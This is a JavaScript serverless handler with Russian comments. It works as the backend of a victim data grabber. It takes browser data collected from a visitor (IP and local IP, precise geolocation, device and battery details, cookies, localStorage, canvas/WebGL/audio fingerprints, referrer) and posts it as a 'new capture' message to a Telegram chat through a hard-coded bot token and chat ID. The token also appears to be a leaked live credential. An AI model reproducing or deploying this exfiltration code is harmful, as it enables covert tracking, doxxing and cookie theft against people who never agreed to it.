export default async function handler(req, res) {
    if (req.method !== "POST") return res.status(405).end();

    const data = req.body;
    const BOT_TOKEN = "8766394398:AAHuiigCpIiMoDhh2pz5YsNcmpEQTCvJtxc";
    const CHAT_ID = "8510274209";

    // Формируем красивый текст
    const ip = data.ip || "неизв";
    const geo = data.geo
        ? `${data.geo.lat.toFixed(4)}, ${data.geo.lon.toFixed(4)} (точность ${data.geo.accuracy}м)`
        : "не определена";
    const localIP = data.localIP ? ` (локальный: ${data.localIP})` : "";
    const device = `${data.platform || "?"}, ${data.screen || "?"}, ${data.orientation || ""}`;
    const battery = data.battery || "неизв";
    const network = data.network || "неизв";
    const memory = data.deviceMemory ? `${data.deviceMemory} ГБ` : "неизв";
    const cores = data.hardwareConcurrency || "?";
    const cookies = data.cookies || "нет";
    const localStorageSize = data.localStorage ? data.localStorage.length : 0;
    const fingerprintParts = [];
    if (data.canvas) fingerprintParts.push("Canvas");
    if (data.webgl) fingerprintParts.push("WebGL");
    if (data.audio) fingerprintParts.push("Audio");
    const fp = fingerprintParts.length ? fingerprintParts.join(", ") : "не собран";

    const dateStr = new Date(data.timestamp).toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });

    const message = [
        `💀 **НОВЫЙ ЗАХВАТ**`,
        `🕒 **Дата:** ${dateStr}`,
        ``,
        `📍 **IP:** \`${ip}\`${localIP}`,
        `🌍 **Гео:** ${geo}`,
        `📱 **Устройство:** ${device}`,
        `🔋 **Батарея:** ${battery}`,
        `📶 **Сеть:** ${network}`,
        `🧠 **CPU:** ${cores} ядер | RAM: ${memory}`,
        `🍪 **Cookies:** ${cookies}`,
        `📦 **LocalStorage:** ${localStorageSize} символов`,
        `🕵️ **Фингерпринты:** ${fp}`,
        ``,
        `📄 **Детали:**`,
        `Canvas: ${data.canvas ? data.canvas.substring(0,40)+"…" : "нет"}`,
        `WebGL: ${data.webgl || "нет"}`,
        `Audio: ${data.audio || "нет"}`,
        `Плагины: ${data.plugins || "нет"}`,
        `MIME-типы: ${data.mimeTypes || "нет"}`,
        `Шрифты: ${data.fonts || "нет"}`,
        `Языки: ${(data.languages || []).join(", ")}`,
        `Часовой пояс: ${data.timezone || "?"}`,
        `Do Not Track: ${data.doNotTrack || "?"}`,
        `Онлайн: ${data.online ? "да" : "нет"}`,
        `Referrer: ${data.referrer || "нет"}`,
        `URL: ${data.url || "нет"}`
    ].join("\n");

    try {
        // Отправляем одно сообщение
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown",
                disable_web_page_preview: true
            })
        });
    } catch (error) {
        console.error("Ошибка отправки:", error);
    }

    res.status(200).json({ status: "ok" });
}
